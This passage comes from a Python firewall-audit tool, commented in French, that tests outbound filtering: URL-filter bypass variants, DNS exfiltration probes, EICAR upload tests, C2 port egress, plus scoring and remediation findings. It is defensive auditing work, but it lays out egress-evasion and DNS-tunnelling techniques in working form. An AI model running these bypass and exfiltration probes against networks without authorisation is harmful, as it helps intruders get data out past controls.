        host = urlparse(base).hostname or ""
        url, headers = base + "/get", {}
        if kind == "query":
            url = base + "/get?q=" + quote(payload, safe="")
            r["target"] = url[:160]
        elif kind == "ua":
            headers = {"User-Agent": payload}
            r["target"] = f"{base}/get  [UA: {payload[:40]}]"
        elif kind == "header":
            headers = {"User-Agent": payload, "X-Firewall-Test": payload}
            r["target"] = f"{base}/get  [en-tête piégé]"
        body = _http_observe(r, url, host, headers=headers)
        # Refus émis par le serveur de test lui-même : on tente l'autre point d'écho.
        if not (r["observed"] == OBS_ALLOWED and (r["http_code"] or 0) >= 400
                and "origine" in r["details"]):
            break

    # Le point d'écho renvoie normalement la charge telle quelle : sa présence
    # dans la réponse prouve qu'aucun équipement ne l'a filtrée ni réécrite.
    marker = payload[:24]
    if r["observed"] == OBS_ALLOWED and marker and body:
        if marker.lower() in body.lower():
            r["confidence"] = CONF_CERTAIN
            r["evidence"] = ("Charge renvoyée intacte par le serveur distant : "
                             "aucune inspection applicative sur le trajet")
        else:
            r["evidence"] += " | Charge non retrouvée dans la réponse : réécriture possible"

    # Un refus émis par l'origine (anti-bot) ne dit rien du pare-feu : sans
    # témoin exploitable, le test ne conclut pas.
    if (r["observed"] == OBS_ALLOWED and (r["http_code"] or 0) >= 400
            and "origine" in r["details"]):
        set_obs(r, OBS_INCONCLUSIVE, CONF_CERTAIN,
                f"HTTP {r['http_code']} émis par le point d'écho lui-même",
                "Protection anti-robot du serveur de test : impossible d'attribuer ce refus "
                "au pare-feu du client")
    return finalize(r, t0)

# ── Contournement ─────────────────────────────────────────────────────────────

def run_bypass_test(test):
    t0 = time.time()
    kind = test["kind"]
    r = new_result("bypass", test["name"], test.get("url") or test.get("domain", ""),
                   category=test.get("category", "bypass"),
                   expected=test["expected"], description=test.get("description", ""))

    if kind in ("url", "alt_port"):
        url  = test["url"]
        host = urlparse(url).hostname or ""
        if kind == "alt_port" and not BASELINE["portquiz"]:
            set_obs(r, OBS_INCONCLUSIVE, CONF_CERTAIN, "Hôte de test injoignable",
                    "portquiz.net n'a pas répondu sur le port 80 de référence")
            return finalize(r, t0)
        _http_observe(r, url, host)
        return finalize(r, t0)

    if kind == "connect_proxy":
        host, port = test["url"].split(":")
        p = tcp_probe(host, int(port))
        if p["state"] == "open":
            set_obs(r, OBS_ALLOWED, CONF_CERTAIN, "Sortie TCP directe possible",
                    "Une application peut sortir sans passer par le proxy déclaré "
                    "(le filtrage applicatif est donc contournable)")
        else:
            set_obs(r, OBS_BLOCKED, CONF_CERTAIN, f"Sortie directe refusée ({p['state']})",
                    "Seul le proxy peut sortir : configuration conforme")
        return finalize(_downgrade_if_no_internet(r), t0)

    domain = test["domain"]
    scheme = test.get("scheme", "https")
    base_domain = domain.lower().rstrip(".")

    if kind == "case":
        _http_observe(r, f"{scheme}://{domain}/", base_domain)
        r["evidence"] = (r["evidence"] + " | Hôte transmis en casse mixte").strip(" |")
        return finalize(r, t0)

    if kind == "trailing_dot":
        _http_observe(r, f"{scheme}://{domain}./", base_domain)
        r["evidence"] = (r["evidence"] + " | FQDN absolu (point final)").strip(" |")
        return finalize(r, t0)

    # direct_ip / decimal_ip : résolution dynamique (pas d'IP figée dans le code)
    ips, err = resolve_host(base_domain)
    v4 = [i for i in ips if ":" not in i]
    if not v4:
        set_obs(r, OBS_INCONCLUSIVE, CONF_CERTAIN, "Domaine non résolu",
                f"Impossible d'obtenir une IPv4 pour {base_domain} ({err or 'aucune réponse'}) — "
                "test de contournement non applicable")
        return finalize(r, t0)
    ip = v4[0]
    r["extra"]["resolved_ip"] = ip

    if kind == "decimal_ip":
        # La notation décimale ne teste que l'analyse d'URL d'un intermédiaire :
        # on l'envoie donc dans l'en-tête Host, sur une connexion directe.
        dec = int(ipaddress.IPv4Address(ip))
        r["target"] = f"http://{dec}/  (= {ip} = {base_domain})"
        p = raw_http_probe(ip, 80, host_header=str(dec), use_tls=False)
        obs, conf, det, ev = classify_raw_probe(p, str(dec))
        set_obs(r, obs, conf, det, ev + f" | Hôte transmis en notation décimale ({dec})")
    else:
        port = 443 if scheme == "https" else 80
        r["target"] = f"{scheme}://{ip}/  (Host + SNI : {base_domain})"
        p = raw_http_probe(ip, port, host_header=base_domain, sni=base_domain,
                           use_tls=(scheme == "https"))
        obs, conf, det, ev = classify_raw_probe(p, base_domain)
        set_obs(r, obs, conf, det, ev)
    return finalize(_downgrade_if_no_internet(r), t0)

# ── Protocoles ────────────────────────────────────────────────────────────────

def run_protocol_test(name, host, port, proto, expected, banner_expect, description):
    t0 = time.time()
    r = new_result("proto", name, f"{host}:{port}", category="protocol",
                   expected=expected, description=description)
    r["extra"]["protocol"] = proto
    _tcp_observe(r, host, port, banner_expect=banner_expect,
                 read_banner=proto in ("ftp", "ssh", "smtp", "imap"))
    if host == PORTQUIZ_HOST and r["observed"] == OBS_BLOCKED and BASELINE["portquiz"]:
        r["confidence"] = CONF_CERTAIN
        r["evidence"] += " | Hôte de test ouvert sur tous les ports : refus imputable au réseau"
    return finalize(r, t0)

# ── Ports non standard ────────────────────────────────────────────────────────

def run_port_test(name, port, category, expected, description):
    t0 = time.time()
    r = new_result("ports", name, f"{PORTQUIZ_HOST}:{port}", category=category,
                   expected=expected, description=description,
                   source="portquiz.net — répond sur tous les ports TCP")
    if not BASELINE["portquiz"]:
        set_obs(r, OBS_INCONCLUSIVE, CONF_CERTAIN, "Hôte de référence injoignable",
                "portquiz.net:80 n'a pas répondu : impossible de distinguer un port filtré "
                "d'un hôte indisponible")
        return finalize(r, t0)
    _tcp_observe(r, PORTQUIZ_HOST, port)
    if r["observed"] == OBS_BLOCKED:
        r["confidence"] = CONF_CERTAIN
        r["evidence"] += " | L'hôte écoute sur tous les ports : le blocage est bien réseau"
    return finalize(r, t0)

# ── Exfiltration DNS ──────────────────────────────────────────────────────────

def run_dns_exfil_test(test):
    t0 = time.time()
    kind = test["kind"]
    r = new_result("dns_exfil", test["name"], test.get("target", ""), category="data_exfil",
                   expected=test["expected"], description=test.get("description", ""))
    srv = BASELINE["dns_servers"][0] if BASELINE["dns_servers"] else None

    if kind in ("long_label", "long_label_b32"):
        if kind == "long_label":
            label = "".join(random.choice("abcdef0123456789") for _ in range(60))
        else:
            label = base64.b32encode(os.urandom(30)).decode().rstrip("=").lower()[:60]
        domain = f"{label}.example.com"
        r["target"] = domain[:80]
        q = dns_query(domain, "A", server=srv) if srv else {"ok": False, "error": "résolveur inconnu", "rcode": "", "answers": []}
        if not srv:
            ips, err = resolve_host(domain)
            q = {"ok": bool(ips), "rcode": "NOERROR" if ips else "NXDOMAIN", "answers": ips, "error": err}
        r["extra"]["rcode"] = q.get("rcode", "")
        if q.get("rcode") in ("NOERROR", "NXDOMAIN") and not q.get("error"):
            set_obs(r, OBS_ALLOWED, CONF_CERTAIN,
                    f"Requête transmise (rcode {q.get('rcode')})",
                    "Une étiquette de 60 caractères a été relayée sans filtrage : "
                    "un tunnel DNS peut sortir des données")
        elif q.get("error") == "timeout":
            set_obs(r, OBS_BLOCKED, CONF_PROBABLE, "Requête sans réponse",
                    "Le résolveur ignore les étiquettes anormalement longues")
        else:
            set_obs(r, OBS_BLOCKED, CONF_PROBABLE, f"Requête rejetée ({q.get('rcode') or q.get('error')})",
                    "Filtrage de la forme de la requête")

    elif kind == "txt":
        q = dns_query(test["target"], "TXT", server=srv) if srv else None
        if q is None:
            set_obs(r, OBS_INCONCLUSIVE, CONF_CERTAIN, "Résolveur système inconnu",
                    "Impossible d'émettre une requête TXT sans adresse de résolveur")
        elif q["ok"] and q["answers"]:
            set_obs(r, OBS_ALLOWED, CONF_CERTAIN, f"TXT retourné ({len(q['answers'])} enregistrement(s))",
                    f"Exemple : {q['answers'][0][:70]} — canal d'exfiltration TXT disponible")
        elif q["error"] == "timeout":
            set_obs(r, OBS_BLOCKED, CONF_PROBABLE, "Requête TXT sans réponse",
                    "Les requêtes TXT semblent filtrées")
        else:
            set_obs(r, OBS_BLOCKED, CONF_PROBABLE, f"TXT indisponible ({q['rcode'] or q['error']})", "")

    elif kind == "resolve":
        q = _system_resolve_detail(test["target"])
        ips = q.get("answers", [])
        r["extra"]["ips"] = ips[:3]
        if ips and not all(is_sinkholed(ip) for ip in ips):
            set_obs(r, OBS_ALLOWED, CONF_CERTAIN, f"Résolu → {', '.join(map(str, ips[:2]))}",
                    "Domaine associé aux outils de tunneling résolu normalement")
        elif ips:
            set_obs(r, OBS_BLOCKED, CONF_CERTAIN, "Puits DNS", f"→ {', '.join(map(str, ips[:2]))}")
        else:
            set_obs(r, OBS_BLOCKED, CONF_PROBABLE, f"Non résolu ({q.get('rcode') or q.get('error')})", "")

    elif kind == "burst":
        ok = fail = 0
        t_start = time.time()
        for i in range(20):
            dom = f"{random.randint(10**9, 10**10)}.example.com"
            if srv:
                q = dns_query(dom, "A", server=srv, timeout=2)
                if q["ok"] and not q["error"]:
                    ok += 1
                else:
                    fail += 1
            else:
                ips, err = resolve_host(dom)
                if err and "timeout" in err.lower():
                    fail += 1
                else:
                    ok += 1
        elapsed = round(time.time() - t_start, 1)
        r["extra"]["burst"] = f"{ok} ok / {fail} échec en {elapsed}s"
        if fail >= 5:
            set_obs(r, OBS_BLOCKED, CONF_PROBABLE, f"Limitation détectée ({fail}/20 échecs)",
                    f"Le résolveur limite le débit de requêtes ({elapsed}s pour 20 requêtes)")
        else:
            set_obs(r, OBS_ALLOWED, CONF_CERTAIN, f"20 requêtes en {elapsed}s sans limitation",
                    "Aucun contrôle de débit DNS : un tunnel peut atteindre un débit exploitable")

    return finalize(_downgrade_if_no_internet(r), t0)

# ── Upload ────────────────────────────────────────────────────────────────────

def run_upload_test(name, filename, content, mimetype, expected, description, echo_base):
    t0 = time.time()
    r = new_result("upload", name, filename, category="data_exfil",
                   expected=expected, description=description,
                   source="Point d'écho contrôlé (accepte tout par défaut)")
    if not echo_base:
        set_obs(r, OBS_INCONCLUSIVE, CONF_CERTAIN, "Aucun point d'écho disponible",
                "Sans serveur témoin, un refus ne peut pas être attribué au filtrage")
        return finalize(r, t0)

    # Les cas EICAR (content None ou "ps") téléchargent la charge à la volée ;
    # elle n'existe jamais dans le fichier source.
    if content is None or content == "ps":
        sig = fetch_eicar()
        if sig is None:
            set_obs(r, OBS_INCONCLUSIVE, CONF_PROBABLE, "Charge EICAR indisponible",
                    "Le téléchargement de la charge de test a échoué ou a été bloqué : "
                    "test d'upload non réalisable depuis ce poste")
            return finalize(r, t0)
        if filename.endswith(".zip"):
            content = _eicar_zip(sig, password_protected=("confidentiel" in filename))
        else:
            content = sig          # .exe / .ps1 : même flux EICAR, extension différente
    url  = echo_base + "/post"
    host = urlparse(echo_base).hostname or ""
    r["target"] = f"{filename} ({len(content)} octets) → {host}"
    try:
        files = {"file": (filename, content, mimetype)}
        resp = requests.post(url, files=files, proxies=PROXIES, verify=False,
                             timeout=(CONNECT_TO, READ_TO),
                             headers={"User-Agent": UA_BROWSER})
        body = resp.text[:MAX_BODY]
        r["http_code"] = resp.status_code
        obs, conf, det, ev, vendor = classify_http(resp, body, host)
        if obs == OBS_ALLOWED and resp.status_code < 400:
            set_obs(r, OBS_ALLOWED, CONF_CERTAIN, f"HTTP {resp.status_code} — fichier accepté",
                    "Le contenu est sorti du réseau sans inspection DLP/antivirus", vendor)
        else:
            set_obs(r, obs, conf, det, ev, vendor)
    except Exception as e:
        obs, conf, det, ev = classify_http_error(e, host)
        set_obs(r, obs, conf, det, ev)
    return finalize(_downgrade_if_no_internet(r), t0)

# ── Débit ─────────────────────────────────────────────────────────────────────

def run_bandwidth_test(name, url, description):
    t0 = time.time()
    r = new_result("bandwidth", name, url, category="bandwidth",
                   expected=EXPECT_INFO, description=description)
    try:
        resp = requests.get(url, proxies=PROXIES, verify=False, stream=True,
                            timeout=(CONNECT_TO, 20), headers={"User-Agent": UA_BROWSER})
        r["http_code"] = resp.status_code
        received, start, first_byte = 0, time.time(), None
        for chunk in resp.iter_content(65536):
            if first_byte is None:
                first_byte = time.time() - start
            received += len(chunk)
            if received >= 12_000_000 or (time.time() - start) > 15:
                break
        elapsed = max(time.time() - start, 0.001)
        resp.close()
        kbps = round((received / 1024) / elapsed)
        r["extra"]["speed_kbps"] = kbps
        r["extra"]["ttfb_ms"] = round((first_byte or 0) * 1000)
        r["extra"]["bytes"] = received
        set_obs(r, OBS_ALLOWED, CONF_CERTAIN,
                f"{kbps} Ko/s ({round(kbps * 8 / 1024, 1)} Mb/s) — {received // 1024} Ko",
                f"Premier octet en {round((first_byte or 0) * 1000)} ms")
    except Exception as e:
        obs, conf, det, ev = classify_http_error(e, urlparse(url).hostname or "")
        set_obs(r, obs, conf, det, ev)
    return finalize(r, t0)

# ═══════════════════════════════════════════════════════════════════════════════
# ORCHESTRATION
# ═══════════════════════════════════════════════════════════════════════════════

class Progress:
    """Barre de progression sur une ligne (désactivée en mode verbeux)."""
    def __init__(self, total, enabled=True):
        self.total, self.done, self.enabled = max(total, 1), 0, enabled
        self.label = ""
        self.t0 = time.time()

    def tick(self, label=""):
        self.done += 1
        if label:
            self.label = label
        if not self.enabled:
            return
        width = 34
        filled = int(width * self.done / self.total)
        pct = int(100 * self.done / self.total)
        bar = C.GREEN + "█" * filled + C.GREY + "░" * (width - filled) + C.RESET
        el = int(time.time() - self.t0)
        line = f"  {bar} {C.B}{pct:3d}%{C.RESET} {C.GREY}{self.done}/{self.total}  {el // 60:02d}:{el % 60:02d}{C.RESET}  {vtrunc(self.label, 34)}"
        sys.stdout.write("\r" + vpad(line, 110))
        sys.stdout.flush()

    def close(self):
        if self.enabled:
            sys.stdout.write("\r" + " " * 110 + "\r")
            sys.stdout.flush()

def count_tests(modules):
    sizes = {
        "url": len(URL_FILTER_TESTS), "eicar": len(EICAR_TESTS), "c2": len(C2_TESTS),
        "dns": len(DNS_TESTS), "ssl": len(SSL_TESTS), "app": len(APP_TESTS),
        "bypass": len(BYPASS_TESTS), "proto": len(PROTOCOL_TESTS),
        "ports": len(NON_STANDARD_PORT_TESTS), "dns_exfil": len(DNS_EXFIL_TESTS),
        "upload": len(UPLOAD_TESTS), "bandwidth": len(BANDWIDTH_TESTS),
    }
    return sum(sizes.get(m, 0) for m in modules)

MODULE_SIZES = {
    "url": len(URL_FILTER_TESTS), "eicar": len(EICAR_TESTS), "c2": len(C2_TESTS),
    "dns": len(DNS_TESTS), "ssl": len(SSL_TESTS), "app": len(APP_TESTS),
    "bypass": len(BYPASS_TESTS), "proto": len(PROTOCOL_TESTS),
    "ports": len(NON_STANDARD_PORT_TESTS), "dns_exfil": len(DNS_EXFIL_TESTS),
    "upload": len(UPLOAD_TESTS), "bandwidth": len(BANDWIDTH_TESTS),
}

VERDICT_ICON = {
    "pass":           (C.GREEN, "OK "),
    "fail":           (C.RED,   "ECH"),
    "warn":           (C.AMBER, " ? "),
    "info":           (C.BLUE,  " i "),
    "policy_blocked": (C.CYAN,  "BLO"),
    "policy_allowed": (C.VIO,   "PAS"),
}

def _print_result(r, verbose):
    if not verbose:
        return
    color, tag = VERDICT_ICON.get(r["verdict"], (C.GREY, " ? "))
    conf = {CONF_CERTAIN: "", CONF_PROBABLE: C.GREY + " (probable)" + C.RESET,
            CONF_WEAK: C.GREY + " (faible)" + C.RESET}.get(r["confidence"], "")
    print(f"   {color}[{tag}]{C.RESET} {vpad(vtrunc(r['name'], 40), 40)} "
          f"{C.GREY}{vtrunc(r['details'], 58)}{C.RESET}{conf}")

def _parallel(fn, items, workers, out, progress, verbose):
    with ThreadPoolExecutor(max_workers=workers) as ex:
        futures = {ex.submit(fn, *it) if isinstance(it, tuple) else ex.submit(fn, it): it
                   for it in items}
        for f in as_completed(futures):
            try:
                r = f.result()
            except Exception as e:                      # un test ne doit jamais tuer l'audit
                continue
            out.append(r)
            _print_result(r, verbose)
            if progress:
                progress.tick(r["name"])
    out.sort(key=lambda x: (x.get("category", ""), x["name"]))

def _skipped_av_result(module, name, description):
    """Résultat 'non exécuté' sans jamais matérialiser de charge sensible."""
    r = new_result(module, name, "—", category="malware",
                   expected=EXPECT_BLOCKED, description=description)
    set_obs(r, OBS_INCONCLUSIVE, CONF_CERTAIN, "Non exécuté (protection endpoint locale)",
            "Ce test matérialiserait la charge EICAR en mémoire, ce qui ferait mettre le "
            "script en quarantaine par l'antivirus. Relancer avec --allow-eicar sur un poste "
            "où le dossier est exclu de l'antivirus.")
    r["verdict"] = "warn"
    return r

def run_all_tests(modules=None, verbose=False, policy=None, quiet=False, allow_eicar=False):
    modules = modules or ALL_MODULES
    results = {
        "meta": {
            "tool": "FirewallTester", "version": VERSION,
            "hostname": socket.gethostname(),
            "os": f"{platform.system()} {platform.release()}",
            "python": platform.python_version(),
            "timestamp": datetime.datetime.now().isoformat(timespec="seconds"),
            "proxy": (list(PROXIES.values())[0] if PROXIES else "aucun (accès direct)"),
            "modules": list(modules),
        },
        "baseline": BASELINE,
        "modules": {},
    }
    progress = None if verbose or quiet else Progress(count_tests(modules), enabled=True)

    def section(title, mod):
        if verbose:
            print(f"\n{C.CYAN}{C.B}▌ {title}{C.RESET} {C.GREY}({MODULE_SIZES.get(mod, 0)} tests){C.RESET}")
        elif progress:
            progress.label = title

    if "url" in modules:
        section("Politique web / filtrage URL", "url")
        out = []
        items = [(n, u, c, s, policy) for (n, u, c, s) in URL_FILTER_TESTS]
        _parallel(run_url_test, items, 14, out, progress, verbose)
        results["modules"]["url"] = out

    if "c2" in modules:
        section("Sorties C2 / IP malveillantes", "c2")
        out = []
        _parallel(run_c2_test, list(C2_TESTS), 8, out, progress, verbose)
        results["modules"]["c2"] = out

    if "dns" in modules:
        section("Filtrage DNS", "dns")
        out = []
        _parallel(run_dns_test, list(DNS_TESTS), 6, out, progress, verbose)
        results["modules"]["dns"] = out

    if "ssl" in modules:
        section("Inspection SSL / TLS", "ssl")
        out = []
        _parallel(run_ssl_test, list(SSL_TESTS), 6, out, progress, verbose)
        results["modules"]["ssl"] = out

    if "app" in modules:
        section("Couche applicative — WAF / IPS", "app")
        out = []
        echo = BASELINE["echo"]
        _parallel(run_app_test, [(t, echo) for t in APP_TESTS], 4, out, progress, verbose)
        results["modules"]["app"] = out

    if "bypass" in modules:
        section("Techniques de contournement", "bypass")
        out = []
        _parallel(run_bypass_test, list(BYPASS_TESTS), 8, out, progress, verbose)
        results["modules"]["bypass"] = out

    if "proto" in modules:
        section("Protocoles alternatifs", "proto")
        out = []
        _parallel(run_protocol_test, list(PROTOCOL_TESTS), 6, out, progress, verbose)
        results["modules"]["proto"] = out

    if "ports" in modules:
        section("Ports non standard", "ports")
        out = []
        _parallel(run_port_test, list(NON_STANDARD_PORT_TESTS), 8, out, progress, verbose)
        results["modules"]["ports"] = out

    if "dns_exfil" in modules:
        section("Exfiltration DNS", "dns_exfil")
        out = []
        for t in DNS_EXFIL_TESTS:                       # séquentiel : mesure de débit
            r = run_dns_exfil_test(t)
            out.append(r); _print_result(r, verbose)
            if progress: progress.tick(r["name"])
        results["modules"]["dns_exfil"] = out

    if "bandwidth" in modules:
        section("Débit / QoS", "bandwidth")
        out = []
        for t in BANDWIDTH_TESTS:                       # séquentiel : mesure fiable
            r = run_bandwidth_test(*t)
            out.append(r); _print_result(r, verbose)
            if progress: progress.tick(r["name"])
        results["modules"]["bandwidth"] = out

    # ── Modules matérialisant EICAR : toujours EN DERNIER, et seulement si autorisés.
    #    Sans --allow-eicar, on ne construit AUCUNE charge (sinon l'antivirus tue le
    #    process et quarantine le script). On produit des résultats 'non exécuté'.
    if "eicar" in modules:
        section("Analyse de contenu / EICAR", "eicar")
        out = []
        if allow_eicar:
            _parallel(run_eicar_test, list(EICAR_TESTS), 4, out, progress, verbose)
        else:
            for name, url, desc in EICAR_TESTS:
                r = _skipped_av_result("eicar", name, desc)
                out.append(r); _print_result(r, verbose)
                if progress: progress.tick(name)
        results["modules"]["eicar"] = out

    if "upload" in modules:
        section("Upload de fichiers", "upload")
        out = []
        echo = BASELINE["echo"]
        for t in UPLOAD_TESTS:
            name, filename, content = t[0], t[1], t[2]
            # Les charges sûres (texte témoin, en-tête PE) restent testées ;
            # seules les charges EICAR/PowerShell sont gelées sans --allow-eicar.
            sensitive = content is None or content == "ps"
            if sensitive and not allow_eicar:
                r = _skipped_av_result("upload", name, t[5])
            else:
                r = run_upload_test(*t, echo)
            out.append(r); _print_result(r, verbose)
            if progress: progress.tick(name)
        results["modules"]["upload"] = out

    if progress:
        progress.close()
    return results

# ═══════════════════════════════════════════════════════════════════════════════
# SCORE
# ═══════════════════════════════════════════════════════════════════════════════

def compute_score(results):
    score = {}
    tot = dict(passed=0, failed=0, warn=0, info=0, pol_blocked=0, pol_allowed=0)
    for mod, tests in results["modules"].items():
        s = dict(label=MODULE_LABELS.get(mod, mod), passed=0, failed=0, warn=0,
                 info=0, pol_blocked=0, pol_allowed=0, total=len(tests))
        for t in tests:
            v = t["verdict"]
            if   v == "pass":            s["passed"] += 1
            elif v == "fail":            s["failed"] += 1
            elif v == "warn":            s["warn"] += 1
            elif v == "info":            s["info"] += 1
            elif v == "policy_blocked":  s["pol_blocked"] += 1
            elif v == "policy_allowed":  s["pol_allowed"] += 1
        s["scored"] = s["passed"] + s["failed"]
        s["pct"] = round(s["passed"] / s["scored"] * 100) if s["scored"] else None
        s["policy_total"] = s["pol_blocked"] + s["pol_allowed"]
        s["policy_pct"] = (round(s["pol_blocked"] / s["policy_total"] * 100)
                           if s["policy_total"] else None)
        score[mod] = s
        for k in tot:
            tot[k] += s[k]
    scored = tot["passed"] + tot["failed"]
    score["_global"] = dict(
        label="Global", passed=tot["passed"], failed=tot["failed"], warn=tot["warn"],
        info=tot["info"], pol_blocked=tot["pol_blocked"], pol_allowed=tot["pol_allowed"],
        scored=scored, total=sum(len(t) for t in results["modules"].values()),
        pct=round(tot["passed"] / scored * 100) if scored else 0,
        policy_total=tot["pol_blocked"] + tot["pol_allowed"],
        policy_pct=(round(tot["pol_blocked"] / (tot["pol_blocked"] + tot["pol_allowed"]) * 100)
                    if (tot["pol_blocked"] + tot["pol_allowed"]) else None),
    )
    return score

def grade(pct):
    if pct >= 90: return "A", "Pare-feu correctement durci"
    if pct >= 75: return "B", "Bon niveau, quelques lacunes ciblées"
    if pct >= 60: return "C", "Protection partielle"
    if pct >= 40: return "D", "Filtrage insuffisant"
    return "F", "Réseau très permissif"

def pct_color(p):
    if p is None: return "#6b7280"
    return "#15803d" if p >= 80 else ("#b45309" if p >= 50 else "#b91c1c")

# ═══════════════════════════════════════════════════════════════════════════════
# CONSTATS / RECOMMANDATIONS
# ═══════════════════════════════════════════════════════════════════════════════

MODULE_FINDINGS = {
    "eicar":     ("critical", "Absence d'analyse antivirale du flux HTTP(S)",
                  "Le fichier de test EICAR a été téléchargé intégralement. Aucun moteur d'analyse "
                  "n'inspecte le contenu transitant par le pare-feu ou le proxy. Un malware réel "
                  "transiterait de la même manière.",
                  "Activer l'analyse antivirale sur le proxy web (et l'inspection TLS, sans laquelle "
                  "les téléchargements HTTPS restent invisibles)."),
    "c2":        ("critical", "Sorties directes vers des ports de commande et contrôle",
                  "Des connexions TCP sortantes aboutissent vers des ports typiquement utilisés par "
                  "les implants (IRC, Tor, ports hauts arbitraires).",
                  "Restreindre le trafic sortant à une liste blanche de ports et forcer le passage "
                  "par le proxy pour les flux web."),
    "dns":       ("major", "Filtrage DNS incomplet ou contournable",
                  "Des domaines malveillants sont résolus normalement, ou le poste peut interroger "
                  "directement des résolveurs publics (UDP/53, DoH, DoT).",
                  "Imposer les résolveurs internes, bloquer UDP/TCP 53 et 853 sortants, et bloquer "
                  "les points d'entrée DoH connus."),
    "ssl":       ("major", "Aucun contrôle des certificats côté réseau",
                  "Des sessions TLS présentant des certificats expirés, auto-signés ou révoqués "
                  "sont relayées jusqu'au poste.",
                  "Activer l'inspection TLS avec vérification de la chaîne, de l'expiration et de "
                  "la révocation, et bloquer les versions TLS 1.0/1.1."),
    "app":       ("major", "Absence d'IPS/WAF sur les flux sortants",
                  "Des charges offensives caractéristiques (SQLi, XSS, Log4Shell, Shellshock) et des "
                  "agents de scanners traversent le pare-feu sans être détectés.",
                  "Activer les signatures IPS en sortie et journaliser les User-Agent de scanners."),
    "bypass":    ("major", "Le filtrage URL est contournable",
                  "Des variantes triviales (IP directe, casse, point final, port alternatif) "
                  "atteignent des ressources dont la catégorie est censée être bloquée.",
                  "Filtrer sur la catégorie résolue et non sur la chaîne d'URL, bloquer l'accès web "
                  "par adresse IP littérale, et appliquer la politique à tous les ports."),
    "proto":     ("major", "Protocoles non bureautiques autorisés en sortie",
                  "FTP, SSH, SMTP, IMAP ou MQTT sortent directement du réseau. Chacun constitue un "
                  "canal d'exfiltration ou de tunneling.",
                  "N'autoriser en sortie que les protocoles nécessaires, via des relais dédiés."),
    "ports":     ("major", "Politique de sortie trop permissive",
                  "Des ports sans usage métier (bases de données, administration, ports hauts) sont "
                  "ouverts en sortie vers Internet.",
                  "Passer d'une logique « tout sauf » à une liste blanche de ports sortants."),
    "dns_exfil": ("major", "Canal d'exfiltration DNS disponible",
                  "Les requêtes à étiquettes longues et les enregistrements TXT sortent sans "
                  "restriction ni limitation de débit.",
                  "Activer la détection de tunneling DNS et limiter le débit par poste."),
    "upload":    ("major", "Aucun contrôle des fichiers sortants (DLP)",
                  "Des exécutables et des charges de test sont sortis du réseau par un simple "
                  "formulaire HTTP.",
                  "Activer l'inspection des uploads (type MIME réel, antivirus, DLP) sur le proxy."),
}

def build_findings(results, score, policy=None):
    """Constats classés par sévérité, chacun adossé aux tests qui le prouvent."""
    findings = []

    # ── 1. Constats globaux issus des mesures de contrôle ─────────────────────
    b = results.get("baseline", {})
    if b.get("proxy_auth_required"):
        findings.append(dict(severity="info", category="baseline",
            title="Authentification proxy requise",
            detail="Le proxy a répondu HTTP 407. Les tests HTTP ne sont pas exploitables sans identifiants.",
            action="Relancer avec --proxy http://utilisateur:motdepasse@hote:port",
            tests=[]))
    if b.get("tls_inspection") is False and b.get("tls_issuer"):
        findings.append(dict(severity="major", category="baseline",
            title="Aucune inspection TLS détectée",
            detail=f"Le certificat de contrôle est émis par « {b['tls_issuer']} », une autorité publique : "
                   "le trafic HTTPS n'est pas déchiffré. Or plus de 90 % du trafic web est chiffré, "
                   "ce qui rend invisible tout filtrage de contenu, antivirus ou DLP sur ces flux.",
            action="Déployer l'inspection TLS avec une autorité interne, en excluant les catégories "
                   "sensibles (santé, banque) pour des raisons juridiques.",
            tests=[]))
    if b.get("tls_inspection") is True:
        findings.append(dict(severity="info", category="baseline",
            title=f"Inspection TLS active ({b.get('tls_issuer')})",
            detail="Le trafic HTTPS est déchiffré par un équipement intermédiaire : "
                   "l'analyse de contenu peut donc s'appliquer.",
            action="", tests=[]))
    if b.get("http_plain") and PROXIES:
        findings.append(dict(severity="minor", category="baseline",
            title="Sortie HTTP directe possible malgré un proxy configuré",
            detail="Le poste atteint Internet en HTTP sans passer par le proxy déclaré.",
            action="Bloquer les ports 80/443 sortants pour tout ce qui n'est pas le proxy.",
            tests=[]))

    # ── 2. Sur-blocage (attendu autorisé, observé bloqué) ─────────────────────
    overblocked = []
    for mod, tests in results["modules"].items():
        for t in tests:
            if t["expected"] == EXPECT_ALLOWED and t["observed"] == OBS_BLOCKED:
                overblocked.append(t)
    if overblocked:
        cats = sorted({t["category"] for t in overblocked})
        sev = "critical" if any(t["category"] == "neutral" for t in overblocked) else "major"
        findings.append(dict(severity=sev, category="overblock",
            title=f"Sur-blocage : {len(overblocked)} ressource(s) légitime(s) bloquée(s)",
            detail="Des ressources qui ne devraient jamais être filtrées sont inaccessibles "
                   f"(catégories : {', '.join(cats)}). Le sur-blocage dégrade l'exploitation "
                   "(sites de sécurité, mises à jour, outils métier) et pousse les utilisateurs "
                   "à contourner la politique.",
            action="Réviser les catégories et ajouter les domaines concernés en liste d'exclusion.",
            tests=[t["name"] for t in overblocked]))

    # ── 3. Constats par catégorie sur le filtrage URL ─────────────────────────
    cat_fail, cat_total = defaultdict(list), defaultdict(int)
    for mod in ("url", "bypass"):
        for t in results["modules"].get(mod, []):
            cat = t["category"]
            if t["expected"] != EXPECT_BLOCKED:
                continue
            cat_total[cat] += 1
            if t["verdict"] == "fail":
                cat_fail[cat].append(t["name"])
    for cat, names in cat_fail.items():
        meta = CATEGORY_META.get(cat, {})
        rec  = RECOMMENDATIONS.get(cat)
        if not rec:
            continue
        findings.append(dict(severity=meta.get("severity", "major"), category=cat,
            title=rec[0], detail=rec[1], action="",
            label=meta.get("label", cat), color=meta.get("color", "#6b7280"),
            ratio=f"{len(names)}/{cat_total[cat]}", tests=sorted(names)))

    # ── 4. Constats par module ────────────────────────────────────────────────
    for mod, (sev, title, detail, action) in MODULE_FINDINGS.items():
        tests = [t for t in results["modules"].get(mod, []) if t["verdict"] == "fail"]
        if not tests:
            continue
        s = score.get(mod, {})
        findings.append(dict(severity=sev, category=mod, title=title, detail=detail,
            action=action, label=MODULE_LABELS.get(mod, mod),
            ratio=f"{s.get('failed', 0)}/{s.get('scored', 0)}",
            tests=[t["name"] for t in tests]))

    order = {"critical": 0, "major": 1, "minor": 2, "info": 3, "none": 4}
    findings.sort(key=lambda f: (order.get(f["severity"], 9), -len(f.get("tests", []))))
    return findings

def policy_summary(results, score):
    """Taux de blocage des catégories discrétionnaires (hors score)."""
    rows = defaultdict(lambda: {"blocked": 0, "total": 0})
    for mod, tests in results["modules"].items():
        for t in tests:
            if t["verdict"] in ("policy_blocked", "policy_allowed"):
                rows[t["category"]]["total"] += 1
                if t["verdict"] == "policy_blocked":
                    rows[t["category"]]["blocked"] += 1
    out = []
    for cat, v in rows.items():
        meta = CATEGORY_META.get(cat, {})
        out.append(dict(category=cat, label=meta.get("label", cat),
                        color=meta.get("color", "#6b7280"),
